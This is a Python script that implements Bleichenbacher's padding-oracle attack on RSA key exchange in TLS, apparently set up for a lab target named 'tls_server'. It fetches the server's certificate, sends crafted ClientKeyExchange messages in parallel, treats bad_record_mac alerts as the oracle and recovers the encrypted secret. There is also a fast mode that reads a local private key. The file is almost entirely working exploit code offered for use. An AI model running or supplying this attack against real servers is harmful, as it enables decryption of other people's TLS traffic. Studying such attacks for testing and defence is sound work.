#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import annotations
import socket, sys, time, binascii, json
from random import randrange
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional speedup: try gmpy2
try:
    import gmpy2
    from gmpy2 import mpz
    def integer_nth_root(n: int, k: int) -> int:
        return int(gmpy2.iroot(mpz(n), k)[0])
except Exception:
    def mpz(x): return int(x)
    def integer_nth_root(n: int, k: int) -> int:
        if n < 0: raise ValueError("n must be non-negative")
        if n == 0: return 0
        bits = n.bit_length()
        lo = 1
        hi = 1 << ((bits + k - 1) // k)
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if mid**k <= n:
                lo = mid
            else:
                hi = mid - 1
        return lo

# tlslite-ng imports (only needed if TLS fetch/oracle used)
try:
    from tlslite.api import TLSConnection, TLSRemoteAlert, TLSAbruptCloseError
    from tlslite.messages import ClientKeyExchange
    from tlslite.constants import AlertDescription, CipherSuite
except Exception:
    TLSConnection = None
    TLSRemoteAlert = Exception
    TLSAbruptCloseError = Exception
    AlertDescription = type("AD", (), {"bad_record_mac": 20})
    CipherSuite = type("CS", (), {"TLS_RSA_WITH_AES_128_CBC_SHA": 0x002F})

# Crypto libs (pycryptodome)
try:
    from Crypto.PublicKey import RSA as CryptoRSA
except Exception:
    CryptoRSA = None

# ------------------------- Configuration (edit here if needed) -------------------------
HOST = "tls_server"
PORT = 4433

# Controls
USE_TEST_CIPHERTEXT = True        # generate local c0 instead of captured handshake ciphertext
AUTO_USE_LOCAL_ORACLE = True      # try local oracle if /app/keys/server_key.pem exists
FALLBACK_PUBLIC_PEM = True        # if TLS fetch fails, try /app/keys/public.pem
BATCH_SIZE = 20                   # number of s candidates to probe in parallel for network oracle
MAX_QUERIES = 200000              # abort after this many oracle queries (safety)
VERBOSE = True

# secret used for test ciphertext (only for generated test ciphertext)
SECRET_BYTES = b"THIS_IS_A_DUMMY_SECRET_FOR_C0"
TARGET_CIPHER_ID = CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA
# -------------------------------------------------------------------------------------

# helpers
def bytes_to_int(b: bytes) -> int:
    return int.from_bytes(b, "big")

def int_to_bytes(n: int, length: int = None) -> bytes:
    if n < 0:
        raise ValueError("Negative integer not supported")
    if length is None:
        length = (n.bit_length() + 7) // 8
    if length == 0:
        return b'\x00'
    return int(n).to_bytes(length, "big")

def ceil_div(a, b):
    a = mpz(a); b = mpz(b)
    if b == 0: raise ZeroDivisionError
    return (a + b - 1) // b

def floor_div(a, b):
    a = mpz(a); b = mpz(b)
    if b == 0: raise ZeroDivisionError
    return a // b

# Public key cache
PUBLIC_KEY_CACHE = {}

def get_public_key(host: str, port: int, timeout: float = 10.0):
    """
    Fetch RSA public key from TLS server (using tlslite-ng).
    If that fails and FALLBACK_PUBLIC_PEM True, try reading /app/keys/public.pem.
    Returns n,e,k
    """
    key = f"{host}:{port}"
    if key in PUBLIC_KEY_CACHE:
        return PUBLIC_KEY_CACHE[key]['n'], PUBLIC_KEY_CACHE[key]['e'], PUBLIC_KEY_CACHE[key]['k']

    if TLSConnection is None:
        raise RuntimeError("tlslite-ng not available and TLS fetch required")

    if VERBOSE: print(f"[+] Connecting to {host}:{port} to fetch certificate...")
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        conn = TLSConnection(sock)
        conn.handshakeClientCert()

        cert_chain = conn.session.serverCertChain
        if not cert_chain or not getattr(cert_chain, "x509List", None):
            raise ValueError("Server did not return a certificate chain")

        der = cert_chain.x509List[0].bytes

        if CryptoRSA is None:
            raise RuntimeError("pycryptodome required to parse cert (Crypto.PublicKey.RSA)")

        keyobj = CryptoRSA.import_key(der)
        n, e = mpz(keyobj.n), mpz(keyobj.e)
        k = (int(n).bit_length() + 7) // 8
        PUBLIC_KEY_CACHE[key] = {'n': n, 'e': e, 'k': k}
        if VERBOSE: print(f"[+] Got RSA public key: {k*8}-bit, e={int(e)}")
        try:
            conn.close()
        except Exception:
            pass
        return n, e, k

    except Exception as ex:
        if sock:
            try: sock.close()
            except: pass
        if VERBOSE: print("[!] TLS cert fetch failed:", ex)
        # fallback to local public.pem (if allowed)
        if FALLBACK_PUBLIC_PEM:
            try:
                with open("/app/keys/public.pem", "rb") as f:
                    keyobj = CryptoRSA.import_key(f.read())
                    n, e = mpz(keyobj.n), mpz(keyobj.e)
                    k = (int(n).bit_length() + 7) // 8
                    PUBLIC_KEY_CACHE[key] = {'n': n, 'e': e, 'k': k}
                    if VERBOSE: print(f"[+] Fallback loaded /app/keys/public.pem: {k*8}-bit, e={int(e)}")
                    return n, e, k
            except Exception as e2:
                if VERBOSE: print("[!] Fallback public.pem load failed:", e2)
        raise

def get_target_ciphertext(n, e, k, secret=SECRET_BYTES):
    ps_len = k - 3 - len(secret)
    if ps_len < 8:
        raise ValueError("Key too small or secret too large")
    ps = b"A" * ps_len
    m = b"\x00\x02" + ps + b"\x00" + secret
    m_int = bytes_to_int(m)
    c0 = pow(m_int, int(e), int(n))
    return mpz(c0)

# TLS oracle query (uses tlslite-ng)
def oracle_query_tls(host: str, port: int, c_int, timeout: float = 5.0):
    """
    Send ClientKeyExchange with ciphertext; return True if server returns bad_record_mac alert.
    """
    n, e, k = get_public_key(host, port)
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        conn = TLSConnection(sock)
        conn.handshakeClientCert()

        c_bytes = int_to_bytes(int(c_int), k)
        cke = ClientKeyExchange(TARGET_CIPHER_ID, conn.session.serverCertChain)
        cke.encryptedPreMasterSecret = c_bytes

        if not hasattr(conn, "_sendMsg") or not hasattr(conn, "_getMsg"):
            raise RuntimeError("tlslite-ng here does not expose _sendMsg/_getMsg; update tlslite-ng")

        try:
            conn._sendMsg(cke)
        except Exception:
            try: sock.close()
            except: pass
            return False

        try:
            conn._getMsg()
        except TLSRemoteAlert as alert:
            try: sock.close()
            except: pass
            return alert.description == AlertDescription.bad_record_mac
        except TLSAbruptCloseError:
            try: sock.close()
            except: pass
            return False
        except Exception:
            try: sock.close()
            except: pass
            return False

        try: sock.close()
        except: pass
        return False

    except TLSRemoteAlert as alert:
        if sock:
            try: sock.close()
            except: pass
        return alert.description == AlertDescription.bad_record_mac
    except Exception:
        if sock:
            try: sock.close()
            except: pass
        return False

# Local oracle (fast) - uses private key file
LOCAL_PRIV = None
def load_local_privkey(path="/app/keys/server_key.pem"):
    global LOCAL_PRIV
    if LOCAL_PRIV is not None:
        return LOCAL_PRIV
    try:
        with open(path, "rb") as f:
            LOCAL_PRIV = CryptoRSA.import_key(f.read())
            if VERBOSE: print("[+] Loaded local private key for fast oracle.")
            return LOCAL_PRIV
    except Exception as e:
        if VERBOSE: print("[!] Could not load local private key:", e)
        return None

def oracle_local(c_int, n_local=None, k_local=None):
    key = load_local_privkey()
    if key is None:
        raise RuntimeError("local private key not available")
    m_int = pow(int(c_int), int(key.d), int(key.n))
    if k_local is None:
        k_local = (int(key.n).bit_length() + 7) // 8
    m_bytes = int_to_bytes(m_int, k_local)
    return len(m_bytes) >= 2 and m_bytes[0] == 0 and m_bytes[1] == 2

# Batch probing helper (parallelizes network oracle checks)
def probe_s_candidates(padding_oracle_fn, c0, e, n, s_start, s_end, batch_size=BATCH_SIZE):
    """
    Test s in [s_start, s_end] in batches of batch_size using ThreadPoolExecutor.
    Returns first s producing True, or None.
    """
    candidates = list(range(int(s_start), int(s_end) + 1))
    for i in range(0, len(candidates), batch_size):
        chunk = candidates[i:i+batch_size]
        with ThreadPoolExecutor(max_workers=len(chunk)) as ex:
            fut_to_s = {}
            for s in chunk:
                c_test = (c0 * pow(s, int(e), int(n))) % int(n)
                fut = ex.submit(padding_oracle_fn, c_test)
                fut_to_s[fut] = s
            for fut in as_completed(fut_to_s):
                s_val = fut_to_s[fut]
                try:
                    ok = fut.result()
                except Exception:
                    ok = False
                if ok:
                    return mpz(s_val)
    return None

# Bleichenbacher core (kept and instrumented)
def _insert(M, a, b):
    for i, (a_, b_) in enumerate(M):
        if a_ <= b and a <= b_:
            a_new = min(a, a_)
            b_new = max(b, b_)
            M[i] = (a_new, b_new)
            return
    M.append((a, b))

def _step_1(padding_oracle, n, e, c):
    s0 = 1
    c0 = c
    trials = 0
    while not padding_oracle(c0):
        trials += 1
        if trials % 500 == 0 and VERBOSE:
            print(f"[step1] trials={trials} still searching s0...")
        s0 = randrange(2, int(n))
        c0 = (c * pow(s0, int(e), int(n))) % int(n)
    return mpz(s0), mpz(c0)

def _step_2a(padding_oracle, n, e, c0, B):
    s = ceil_div(n, 3 * B)
    if VERBOSE: print(f"[step2a] starting s ~ {s}")
    if padding_oracle is oracle_local:
        while not padding_oracle((c0 * pow(s, int(e), int(n))) % int(n)):
            s += 1
        return mpz(s)
    window = 256
    while True:
        s_end = s + window - 1
        if VERBOSE: print(f"[step2a] probing s range {s}..{s_end} (window={window})")
        found = probe_s_candidates(padding_oracle, c0, e, n, s, s_end, batch_size=BATCH_SIZE)
        if found:
            return mpz(found)
        s = s_end + 1
        window = min(window * 2, 10000)

def _step_2b(padding_oracle, n, e, c0, s):
    s = mpz(s) + 1
    if padding_oracle is oracle_local:
        while not padding_oracle((c0 * pow(int(s), int(e), int(n))) % int(n)):
            s += 1
        return mpz(s)
    start = int(s)
    window = 256
    while True:
        end = start + window - 1
        if VERBOSE: print(f"[step2b] probing s range {start}..{end}")
        found = probe_s_candidates(padding_oracle, c0, e, n, start, end, batch_size=BATCH_SIZE)
        if found:
            return mpz(found)
        start = end + 1
        window = min(window * 2, 10000)

def _step_2c(padding_oracle, n, e, c0, B, s, a, b):
    r = ceil_div(2 * (b * s - 2 * B), n)
    while True:
        left = ceil_div(2 * B + r * n, b)
        right = floor_div(3 * B + r * n, a)
        if left <= right and VERBOSE:
            print(f"[step2c] r={r}, testing s in {left}..{right}")
        for s_candidate in range(int(left), int(right) + 1):
            if padding_oracle((c0 * pow(s_candidate, int(e), int(n))) % int(n)):
                return mpz(s_candidate)
        r += 1

def _step_3(n, B, s, M):
    M_ = []
    for (a, b) in M:
        left = ceil_div(a * s - 3 * B + 1, n)
        right = floor_div(b * s - 2 * B, n)
        for r in range(int(left), int(right) + 1):
            a_ = max(a, ceil_div(2 * B + r * n, s))
            b_ = min(b, floor_div(3 * B - 1 + r * n, s))
            _insert(M_, a_, b_)
    return M_

def bleichenbacher_attack(padding_oracle, n, e, c, verbose=False):
    k = ceil_div(n.bit_length(), 8)
    B = mpz(2) ** (8 * (k - 2))
    if verbose: print(f"[+] k={k}, B={B}")

    s0, c0 = _step_1(padding_oracle, n, e, c)
    M = [(2 * B, 3 * B - 1)]
    if verbose: print("[*] Step 1 done. Found s0.")

    s = _step_2a(padding_oracle, n, e, c0, B)
    M = _step_3(n, B, s, M)
    if verbose: print("[*] Step 2a done. Found s1; intervals:", len(M))

    it = 0
    while True:
        it += 1
        loop_t0 = time.time()
        if verbose:
            print(f"[loop] iteration {it}, intervals {len(M)}")
        if len(M) > 1:
            s = _step_2b(padding_oracle, n, e, c0, s)
        else:
            (a, b) = M[0]
            if a == b:
                m_ = (a * pow(int(s0), -1, int(n))) % int(n)
                return mpz(m_)
            s = _step_2c(padding_oracle, n, e, c0, B, s, a, b)
        M = _step_3(n, B, s, M)
        if verbose:
            elapsed = time.time() - loop_t0
            print(f"[loop] done it={it}, elapsed={elapsed:.3f}s, intervals_now={len(M)}")
        # safety: abort if padding_oracle tracks queries attribute
        if hasattr(padding_oracle, "_queries") and padding_oracle._queries > MAX_QUERIES:
            raise RuntimeError(f"Exceeded MAX_QUERIES ({MAX_QUERIES}) - aborting")

# Adapter to track queries and store public key for network oracle
class TLSOracleAdapter:
    def __init__(self, host, port, padding_fn, max_queries=MAX_QUERIES):
        self.host = host
        self.port = port
        self.padding_fn = padding_fn
        n,e,k = get_public_key(host, port)
        self.n = int(n); self.e = int(e); self.k = int(k)
        self._queries = 0
        self.max_queries = max_queries

    def __call__(self, c_int):
        self._queries += 1
        setattr(self.padding_fn, "_queries", self._queries)
        if self._queries % 50 == 0 or (VERBOSE and self._queries % 10 == 0):
            print(f"[oracle] queries={self._queries}")
        if self._queries > self.max_queries:
            raise RuntimeError(f"Exceeded MAX_QUERIES ({self.max_queries}) - aborting")
        return self.padding_fn(c_int)

# ------------------------------- Main -------------------------------
def run():
    print(f"[+] Starting Attack A against {HOST}:{PORT}")

    # pick oracle: prefer local if available & AUTO_USE_LOCAL_ORACLE True
    padding_oracle = None
    padding_oracle_callable = None
    if AUTO_USE_LOCAL_ORACLE and load_local_privkey() is not None:
        padding_oracle = oracle_local
        # wrapper to count queries on local oracle
        def wrapper_local(c):
            if not hasattr(wrapper_local, "_queries"):
                wrapper_local._queries = 0
            wrapper_local._queries += 1
            if wrapper_local._queries % 100 == 0 and VERBOSE:
                print(f"[local-oracle] queries={wrapper_local._queries}")
            if wrapper_local._queries > MAX_QUERIES:
                raise RuntimeError("Exceeded MAX_QUERIES (local) - aborting")
            # compute using private key
            key = load_local_privkey()
            n_local = int(key.n); k_local = (n_local.bit_length()+7)//8
            return oracle_local(c, n_local=n_local, k_local=k_local)
        padding_oracle_callable = wrapper_local
        key = load_local_privkey()
        n = int(key.n); e = int(key.e); k = (int(n).bit_length() + 7) // 8
        if VERBOSE: print("[*] Using local oracle (fast).")
    else:
        # network oracle
        padding_oracle = lambda c: oracle_query_tls(HOST, PORT, c)
        try:
            adapter = TLSOracleAdapter(HOST, PORT, padding_oracle, max_queries=MAX_QUERIES)
            padding_oracle_callable = adapter
            n = adapter.n; e = adapter.e; k = adapter.k
            if VERBOSE: print("[*] Using TLS network oracle (may be slow).")
        except Exception as ex:
            print("[!] Failed to init network oracle:", ex)
            return

    # prepare target ciphertext (use test c0 by default)
    if USE_TEST_CIPHERTEXT:
        c = int(get_target_ciphertext(n, e, k, secret=SECRET_BYTES))
        print("[*] Using generated test ciphertext for attack.")
    else:
        print("[!] USE_TEST_CIPHERTEXT is False but no captured ciphertext was provided.")
        return

    start = time.time()
    try:
        m_int = bleichenbacher_attack(padding_oracle_callable, n, e, c, verbose=VERBOSE)
    except KeyboardInterrupt:
        print("Interrupted by user.")
        return
    except Exception as ex:
        print("[!] Attack failed:", ex)
        return
    end = time.time()
    print(f"[+] Attack finished in {end - start:.2f}s")

    try:
        padded = int_to_bytes(int(m_int), k)
    except Exception:
        padded = int_to_bytes(int(m_int))
    if len(padded) < 2 or padded[0] != 0 or padded[1] != 2:
        print("[!] Recovered plaintext does not have PKCS#1 v1.5 padding header (00 02).")
        print("Recovered (hex):", hex(int(m_int)))
    else:
        try:
            idx = padded.index(b'\x00', 2)
            secret = padded[idx+1:]
            print("[+] Recovered padded plaintext (hex):", binascii.hexlify(padded))
            print("[+] Recovered secret bytes:", secret)
            try:
                print("[+] Recovered secret (utf-8):", secret.decode())
            except Exception:
                pass
        except ValueError:
            print("[!] No 0x00 separator found in padding. Raw padded (hex):", binascii.hexlify(padded))

if __name__ == "__main__":
    run()
